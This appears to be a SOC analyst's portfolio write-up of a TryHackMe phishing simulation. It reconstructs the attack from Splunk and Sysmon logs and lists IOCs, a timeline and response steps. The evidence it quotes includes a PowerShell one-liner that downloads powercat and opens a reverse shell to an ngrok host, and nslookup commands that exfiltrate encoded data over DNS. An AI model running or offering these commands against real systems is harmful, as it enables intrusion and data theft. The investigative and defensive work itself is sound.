# SOC Investigation: Phishing Unfolding

**TryHackMe:** Phishing Unfolding SOC Simulator  
**Environment:** Simulated SOC environment  
**SIEM:** Splunk  
**Telemetry:** Sysmon, email, DNS, process, file, registry and network-related events  
**Investigation date:** September 5, 2026  
**Primary compromised host:** `win-3450`  
**Affected user:** Michael Ascot, CEO

TryHackMe SOC Simulator Summary: https://tryhackme.com/soc-sim/public-summary/10519b05f0aa66a42e38004b01a2bf514347d86cb631a661e3585ba1cda69212953de2e67642a92658442164f0be5425

Raw Notes:[Notion_Raw_Notes_SOC_Investigation_Phishing_Simulation.md](screenshots/Notion_Raw_Notes_SOC_Investigation_Phishing_Simulation.md/)

## 1. Overview

This investigation was performed as part of the **TryHackMe SOC Simulator - Phishing Unfolding** scenario.

The investigation began with alert **1025**, a high-severity `Suspicious Parent Child Relationship` alert involving `nslookup.exe` spawned by `powershell.exe` on `win-3450`.

Rather than treating the alert as an isolated event, I pivoted through the available SIEM telemetry and correlated related alerts, processes, files, DNS activity, user activity, and timestamps.

The investigation established a connected attack sequence involving:

1. Phishing email delivery
2. Malicious ZIP attachment
3. Extraction of a disguised `.lnk` file
4. User interaction through Outlook
5. PowerShell execution
6. External payload retrieval
7. Reverse shell establishment
8. Host reconnaissance
9. Network share access
10. Collection of files
11. Archive creation
12. DNS-based data exfiltration

The correlated alert set included:

`1005 → 1006 → 1020 → 1022 → 1023 → 1024 → 1025 → 1026 → 1027 → 1028 → 1029 → 1030 → 1031 → 1032 → 1033 → 1034`

The investigation also included several unrelated low-severity alerts that were determined to be false positives, demonstrating the importance of validating an alert against host and process context.

---

# 2. Tools & Environment

### Tools

* **Splunk SIEM**

  * Searching and correlating telemetry
  * Process investigation
  * Email investigation
  * DNS investigation
  * Timeline reconstruction

* **Sysmon telemetry**

  * Process creation
  * File creation
  * DNS queries
  * Registry activity
  * Parent-child process relationships

* **TryDetectThis**

  * File/hash analysis
  * Malware verdicts

* **TryHackMe SOC Simulator**

  * Alert triage
  * Alert classification
  * Escalation decisions
  * Case reporting

### Primary host

| Field                 | Value                                                  |
| --------------------- | ------------------------------------------------------ |
| Host                  | `win-3450`                                             |
| User                  | Michael Ascot                                          |
| Role                  | CEO                                                    |
| Email                 | `michael.ascot@tryhatme.com`                           |
| Initial attack vector | Phishing email                                         |
| Confirmed activity    | Execution, reconnaissance, collection and exfiltration |

---

# 3. Investigation Methodology

The investigation followed a basic SOC investigation workflow:

```text
Alert
  ↓
Understand the detection
  ↓
Validate the telemetry
  ↓
Identify affected host/user
  ↓
Pivot through related events
  ↓
Build a timeline
  ↓
Correlate alerts
  ↓
Identify IOCs
  ↓
Determine scope and impact
  ↓
Classify and escalate
  ↓
Document findings
```

A key lesson from this investigation was:

> The alert tells me where to look. The logs tell me what happened. Context tells me what it means.

---

# 4. Initial Alert Investigation

## Alert 1025

**Detection:** Suspicious Parent Child Relationship  
**Severity:** High  
**Type:** Process  
**Host:** `win-3450`  
**Timestamp:** `09/05/2026 14:19:22.992`

The alert identified:

```text
Parent:
powershell.exe
PID: 3728

Child:
nslookup.exe
PID: 5520

Working Directory:
C:\Users\michael.ascot\downloads\exfiltration\
```

The command line contained:

```text
"C:\Windows\system32\nslookup.exe"
UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
```

The combination of:

* PowerShell spawning `nslookup.exe`
* execution from an `exfiltration` directory
* a Base64-looking value
* communication with `haz4rdw4re.io`
* multiple similar `nslookup.exe` executions

made the alert significantly more suspicious than a normal Windows process relationship.

This prompted investigation of the activity immediately before alert 1025.

---

# 5. Initial Access: Phishing Email

## Alert 1005

**Detection:** Suspicious Attachment found in email  
**Severity:** Low  
**Classification:** True Positive  
**Host:** `win-3450`  

The email was sent to:

```text
michael.ascot@tryhatme.com
```

From:

```text
john@hatmakereurope.xyz
```

Subject:

```text
FINAL NOTICE: Overdue Payment - Account Suspension Imminent
```

Attachment:

```text
ImportantInvoice-Febrary.zip
```

The email used several phishing indicators:

* Urgent language
* Account suspension threat
* Payment-related social engineering
* Suspicious external domain
* ZIP attachment
* Misspelled filename: `Febrary`

The attachment MD5 recorded during the investigation was:

```text
332ffb18aa5c12126e4befd02388a6be
```

---

# 6. Malicious Attachment Analysis

The ZIP archive was submitted to the **TryDetectThis** analysis platform.

The initial ZIP analysis displayed a clean result:

```text
ImportantInvoice-Febrary.zip
```

However, after extraction, the archive contained:

```text
invioce.pdf.lnk
```

The filename attempted to make the file appear to be a PDF while actually being a Windows shortcut.

The extracted file MD5 was:

```text
ed1dc2d678743fcbedf0d743e27d0362
```

TryDetectThis classified the extracted `.lnk` file as:

```text
ANALYZED - Malicious
```

This was an important investigative pivot.

The archive itself did not provide the complete picture. Examining the contents of the archive revealed the malicious shortcut.

---

# 7. User Interaction and Execution

Sysmon telemetry showed the attachment being written into the user's Outlook cache.

At:

```text
09/05/2026 14:14:06.992
```

Sysmon recorded:

```text
event.code: 11
event.action: File created
process.name: OUTLOOK.EXE
host.name: win-3450
```

The file path referenced:

```text
ImportantInvoice-Febrary.zip:Zone.Identifier
```

Shortly afterward, the extracted shortcut appeared in a temporary extraction location.

At:

```text
09/05/2026 14:14:17.992
```

Sysmon recorded:

```text
event.code: 15
event.action: File stream created
process.name: Explorer.EXE
```

The path contained:

```text
ImportantInvoice-Febrary\invioce.pdf.lnk
```

This established a sequence connecting the phishing attachment to activity on the endpoint.

---

# 8. PowerShell Execution

At:

```text
09/05/2026 14:14:18.992
```

Sysmon recorded a PowerShell process on `win-3450`.

Parent:

```text
Explorer.exe
```

Child:

```text
powershell.exe
```

The command line contained:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
```

This command is significant because it:

1. Downloads Powercat from an external source.
2. Executes the downloaded content through PowerShell.
3. Connects to an external ngrok endpoint.
4. Provides a PowerShell command shell.

The activity therefore moved from phishing delivery into endpoint execution and command-and-control activity.

---

# 9. Command-and-Control Activity

Before the PowerShell execution, DNS telemetry showed a query for:

```text
2.tcp.ngrok.io
```

At:

```text
09/05/2026 14:14:10.992
```

The DNS response was:

```text
3.22.53.161
```

The relevant telemetry included:

```text
datasource: sysmon
event.code: 22
network.protocol: dns
host.name: win-3450
process.name: powershell.exe
```

The PowerShell command subsequently referenced:

```text
2.tcp.ngrok.io
Port: 19282
```

This provided network-level context for the PowerShell execution.

---

# 10. Reconnaissance

After establishing PowerShell execution, the attacker performed local reconnaissance.

### System information

At:

```text
09/05/2026 14:14:34.992
```

Sysmon recorded:

```text
systeminfo.exe
```

Parent:

```text
powershell.exe
PID: 9060
```

### Current user

At:

```text
09/05/2026 14:14:42.992
```

Sysmon recorded:

```text
whoami.exe
```

Parent:

```text
powershell.exe
PID: 9060
```

### Privileges

At:

```text
09/05/2026 14:14:50.992
```

The command was:

```text
whoami.exe /priv
```

### Local users

At:

```text
09/05/2026 14:14:56.992
```

The attacker executed:

```text
net user
```

### Local groups

At:

```text
09/05/2026 14:15:03.992
```

The attacker executed:

```text
net localgroup
```

These events showed systematic host reconnaissance following the initial execution.

---

# 11. Access to Network Resources

At:

```text
09/05/2026 14:17:24.992
```

Sysmon recorded:

```text
net.exe use Z: \\FILESRV-01\SSF-FinancialRecords
```

Parent:

```text
powershell.exe
PID: 3728
```

This mapped the remote financial records share to drive `Z:`.

The associated alert was:

**1022 - Network drive mapped to a local drive**

This was classified as a true positive.

The activity was significant because the attacker had moved beyond local reconnaissance and accessed a network file share containing financial records.

---

# 12. Data Collection

At:

```text
09/05/2026 14:18:11.992
```

Sysmon recorded `Robocopy.exe` executing from the mapped drive.

The destination was:

```text
C:\Users\michael.ascot\downloads\exfiltration\
```

Files observed in the destination included:

```text
ClientPortfolioSummary.xlsx
InvestorPresentation2023.pptx
```

The files were created by:

```text
Robocopy.exe
```

This provided direct evidence of collection into a local staging directory.

---

# 13. Network Share Removal

After the files were copied, the mapped network drive was disconnected.

At:

```text
09/05/2026 14:18:22.992
```

Sysmon recorded:

```text
net.exe use Z: /delete
```

Parent:

```text
powershell.exe
PID: 3728
```

This activity corresponded with:

**Alert 1024 - Network drive disconnected from a local drive**

The sequence was:

```text
Map financial share
       ↓
Copy files
       ↓
Disconnect share
```

This correlation strengthened the conclusion that the drive mapping was part of the same attack activity rather than normal user administration.

---

# 14. Data Staging and Archive Creation

At:

```text
09/05/2026 14:17:17.992
```

Sysmon recorded creation of:

```text
C:\Users\michael.ascot\Downloads\exfiltration
```

Later, at:

```text
09/05/2026 14:18:40.992
```

PowerShell created:

```text
C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip
```

The sequence therefore showed:

```text
Network share
     ↓
Financial files
     ↓
Exfiltration directory
     ↓
exfilt8me.zip
```

This is consistent with data staging before exfiltration.

---

# 15. DNS-Based Exfiltration

Following the creation of the archive, the investigation returned to alert **1025**.

The suspicious `nslookup.exe` command contained:

```text
UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
```

Additional `nslookup.exe` events used different encoded-looking values with:

```text
.haz4rdw4re.io
```

The alert sequence included:

```text
1025
1026
1027
1028
1029
1030
1031
1032
1033
1034
```

These alerts shared the same general behavior:

```text
powershell.exe
      ↓
nslookup.exe
      ↓
encoded-looking data
      ↓
haz4rdw4re.io
```

The repeated queries strongly supported the interpretation that data was being transferred through DNS queries.

This was the final major stage identified in the investigation.

---

# 16. Correlated Attack Chain

The investigation produced the following attack-chain model:

```text
Phishing Email
    │
    ▼
1005
Suspicious ZIP attachment
    │
    ▼
ImportantInvoice-Febrary.zip
    │
    ▼
invioce.pdf.lnk
    │
    ▼
User interaction through Outlook / Explorer
    │
    ▼
PowerShell execution
    │
    ├──────────────► External payload retrieval
    │
    └──────────────► ngrok C2
                       │
                       ▼
                  Reverse shell
                       │
                       ▼
                 Reconnaissance
                       │
                       ├── systeminfo
                       ├── whoami
                       ├── whoami /priv
                       ├── net user
                       └── net localgroup
                       │
                       ▼
                 Network share access
                       │
                       ▼
              FILESRV-01 financial share
                       │
                       ▼
                  Robocopy
                       │
                       ▼
                 File staging
                       │
                       ▼
                 exfilt8me.zip
                       │
                       ▼
                nslookup.exe
                       │
                       ▼
              DNS exfiltration
                       │
                       ▼
                haz4rdw4re.io
```

---

# 17. Alert Correlation

The TryHackMe summary showed the following alerts as correctly classified within the investigation:

| Alert | Detection                                     | Severity | Classification |
| ----- | --------------------------------------------- | -------: | -------------- |
| 1005  | Suspicious Attachment found in email          |      Low | True Positive  |
| 1006  | Suspicious Parent Child Relationship          |      Low | False Positive |
| 1020  | PowerShell Script in Downloads Folder         |      Low | True Positive  |
| 1022  | Network drive mapped to a local drive         |   Medium | True Positive  |
| 1023  | Suspicious Parent Child Relationship          |      Low | True Positive  |
| 1024  | Network drive disconnected from a local drive |   Medium | True Positive  |
| 1025  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1026  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1027  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1028  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1029  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1030  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1031  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1032  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1033  | Suspicious Parent Child Relationship          |     High | True Positive  |
| 1034  | Suspicious Parent Child Relationship          |     High | True Positive  |

The investigation also covered alerts 1000, 1001 and 1002, which demonstrated why alert context is important.

---

# 18. False Positive Analysis

## Alert 1001

**Detection:** Suspicious Parent Child Relationship  
**Host:** `win-3459`  
**Process:** `TrustedInstaller.exe`  
**Parent:** `services.exe`  

The observed relationship was:

```text
services.exe
      ↓
TrustedInstaller.exe
```

The process command line was:

```text
C:\Windows\servicing\TrustedInstaller.exe
```

Working directory:

```text
C:\Windows\system32\
```

The telemetry was consistent with legitimate Windows servicing activity.

The alert was therefore classified as a **false positive**.

---

## Alert 1002

**Detection:** Suspicious Parent Child Relationship  
**Host:** `win-3451`  
**Process:** `taskhostw.exe`  
**Parent:** `svchost.exe`

Command line:

```text
taskhostw.exe KEYROAMING
```

Working directory:

```text
C:\Windows\system32\
```

The observed:

```text
svchost.exe → taskhostw.exe
```

relationship did not show additional suspicious activity.

The alert was therefore classified as a **false positive**.

These two investigations demonstrated an important SOC principle:

> A suspicious process relationship by itself does not prove malicious activity.

The analyst needs to examine the executable path, command line, host context, surrounding events and related activity before making a determination.

---

# 19. Indicators of Compromise

## Email indicators

| Indicator  | Value                                                         |
| ---------- | ------------------------------------------------------------- |
| Sender     | `john@hatmakereurope.xyz`                                     |
| Recipient  | `michael.ascot@tryhatme.com`                                  |
| Subject    | `FINAL NOTICE: Overdue Payment - Account Suspension Imminent` |
| Attachment | `ImportantInvoice-Febrary.zip`                                |

## File indicators

### ZIP

```text
ImportantInvoice-Febrary.zip
MD5: 332ffb18aa5c12126e4befd02388a6be
```

### Malicious shortcut

```text
invioce.pdf.lnk
MD5: ed1dc2d678743fcbedf0d743e27d0362
```

## Domains

```text
raw.githubusercontent.com
2.tcp.ngrok.io
haz4rdw4re.io
```

## IP addresses observed

```text
3.22.53.161
```

The GitHub content domain resolved to multiple IP addresses in the observed DNS telemetry, including:

```text
185.199.111.133
185.199.110.133
185.199.109.133
185.199.108.133
```

## File staging paths

```text
C:\Users\michael.ascot\Downloads\exfiltration\
```

```text
C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip
```

---

# 20. Key Process Relationships

The following process relationships were particularly important during the investigation:

```text
Explorer.exe
    ↓
powershell.exe
```

```text
powershell.exe
    ↓
systeminfo.exe
```

```text
powershell.exe
    ↓
whoami.exe
```

```text
powershell.exe
    ↓
net.exe
```

```text
powershell.exe
    ↓
Robocopy.exe
```

```text
powershell.exe
    ↓
nslookup.exe
```

The final relationship was especially significant because `nslookup.exe` was repeatedly used with encoded-looking data and the `haz4rdw4re.io` domain.

---

# 21. Timeline

| Time         | Activity                                                          |
| ------------ | ----------------------------------------------------------------- |
| 13:53:59.992 | Phishing email containing `ImportantInvoice-Febrary.zip` received |
| 14:14:06.992 | Outlook creates attachment-related file in INetCache              |
| 14:14:09.992 | DNS query for `raw.githubusercontent.com`                         |
| 14:14:10.992 | DNS query for `2.tcp.ngrok.io`                                    |
| 14:14:17.992 | `invioce.pdf.lnk` appears during extraction                       |
| 14:14:18.992 | PowerShell launches from Explorer                                 |
| 14:14:21.992 | PowerShell-related temporary script file created                  |
| 14:14:34.992 | `systeminfo.exe` executed                                         |
| 14:14:42.992 | `whoami.exe` executed                                             |
| 14:14:50.992 | `whoami.exe /priv` executed                                       |
| 14:14:56.992 | `net user` executed                                               |
| 14:15:03.992 | `net localgroup` executed                                         |
| 14:17:17.992 | Exfiltration directory created                                    |
| 14:17:24.992 | Financial records network share mapped to `Z:`                    |
| 14:18:11.992 | Robocopy copies files into exfiltration directory                 |
| 14:18:22.992 | Network share disconnected                                        |
| 14:18:40.992 | `exfilt8me.zip` created                                           |
| 14:19:22.992 | Alert 1025 triggered by `nslookup.exe`                            |
| 14:19:25.992 | Additional `nslookup.exe` activity observed                       |
| 14:22:54.992 | Registry activity observed on `win-3450`                          |

---

# 22. Impact Assessment

Based on the telemetry collected during the investigation, the affected endpoint was:

```text
win-3450
```

The affected user was:

```text
Michael Ascot
CEO
michael.ascot@tryhatme.com
```

The investigation identified evidence of:

* Successful phishing delivery
* Malicious file execution
* PowerShell execution
* External payload retrieval
* Reverse-shell activity
* Host reconnaissance
* Access to a financial records network share
* Collection of business documents
* Local staging
* Archive creation
* DNS-based exfiltration activity

Files observed during collection included:

```text
ClientPortfolioSummary.xlsx
InvestorPresentation2023.pptx
```

The evidence therefore supports treating `win-3450` as a compromised endpoint within the simulated environment.

---

# 23. Recommended Response Actions

Based on the evidence collected during the investigation, the following response actions were identified:

### Endpoint containment

* Isolate `win-3450` from the network.
* Preserve relevant forensic evidence before remediation.
* Investigate other systems for related indicators.

### Account security

* Rotate credentials associated with the affected account.
* Review authentication activity for the affected user.
* Investigate whether the compromised account was used elsewhere.

### IOC blocking

Consider blocking or monitoring the identified malicious infrastructure:

```text
john@hatmakereurope.xyz
hatmakereurope.xyz
2.tcp.ngrok.io
haz4rdw4re.io
```

### File remediation

Remove or quarantine:

```text
ImportantInvoice-Febrary.zip
invioce.pdf.lnk
exfilt8me.zip
```

and investigate any additional malicious files created during execution.

### Network investigation

Investigate:

```text
FILESRV-01
```

for access to the financial records share and determine whether additional files or systems were accessed.

### Detection improvements

Create or tune detections for combinations such as:

```text
PowerShell
    +
nslookup.exe
    +
encoded-looking arguments
    +
unusual external domain
```

and:

```text
PowerShell
    +
network share mapping
    +
file copying
    +
archive creation
```

---

# 24. Lessons Learned

### 1. A low-severity alert can be the beginning of a serious investigation

Alert 1005 was classified as low severity, but the associated evidence led to a much larger compromise investigation.

### 2. High severity does not automatically mean malicious

Alert 1025 became meaningful because the surrounding telemetry showed why the `nslookup.exe` behavior was suspicious.

### 3. Parent-child relationships require context

Alerts 1001 and 1002 demonstrated that legitimate Windows processes can trigger generic parent-child detection rules.

### 4. Alert correlation is critical

The investigation became much clearer when the individual alerts were connected into a single sequence rather than investigated independently.

### 5. Timeline reconstruction helps reveal attacker behavior

Looking at events chronologically connected:

```text
Email
→ File
→ Execution
→ C2
→ Recon
→ Collection
→ Staging
→ Exfiltration
```

### 6. SIEM investigation requires pivots

Useful pivots during this investigation included:

```text
Alert → Host
Host → User
Host → Process
Process → Parent
Process → Command Line
Command Line → Domain
Domain → DNS
File → Hash
File → Process
Timestamp → Related Events
Alert → Related Alerts
```

---

# 25. Final Assessment

The investigation determined that the activity associated with `win-3450` represented a **true positive phishing-driven compromise** in the simulated environment.

The evidence connected the initial phishing email and malicious attachment to endpoint execution, PowerShell-based command-and-control activity, reconnaissance, access to a financial records share, file collection, archive creation and subsequent DNS-based exfiltration activity.

The investigation also demonstrated the importance of distinguishing unrelated detection noise from activity belonging to the same incident. Alerts 1001 and 1002 were investigated separately and classified as false positives because the associated process relationships and execution paths did not show suspicious behavior.

The primary incident was therefore documented as a **single correlated attack chain**, with the individual alerts serving as detection points throughout the progression of the compromise.

---

## 26. Portfolio Summary

### Skills demonstrated

* SOC alert triage
* Splunk SIEM investigation
* Sysmon analysis
* Phishing analysis
* Email investigation
* Process tree analysis
* Parent-child process analysis
* PowerShell investigation
* DNS investigation
* IOC extraction
* File/hash analysis
* Timeline reconstruction
* Alert correlation
* False-positive analysis
* Incident classification
* Escalation decisions
* SOC case reporting

### MITRE ATT&CK-style activity observed

The investigation included behavior consistent with several common attacker techniques, including:

* Phishing
* User execution
* PowerShell
* Command and scripting interpreter activity
* System information discovery
* Account discovery
* Network share access
* Data staging
* Data collection
* DNS-based exfiltration

These mappings are based on the observed behavior in the lab rather than claiming that every activity was explicitly mapped by the TryHackMe scenario.

---

## 27. Investigation Takeaway

The biggest takeaway from this investigation was learning to move from **alert-driven thinking to evidence-driven investigation**.

Instead of asking only:

> "Why did this alert trigger?"

the investigation progressed toward:

> "What happened before this event, what happened afterward, what other telemetry supports it, and how do these events fit together?"

That approach made it possible to identify the relationship between the phishing email, malicious attachment, PowerShell execution, reconnaissance, network share access, data staging and DNS exfiltration.

**The alert was only the starting point. The timeline and correlated evidence established the incident.**
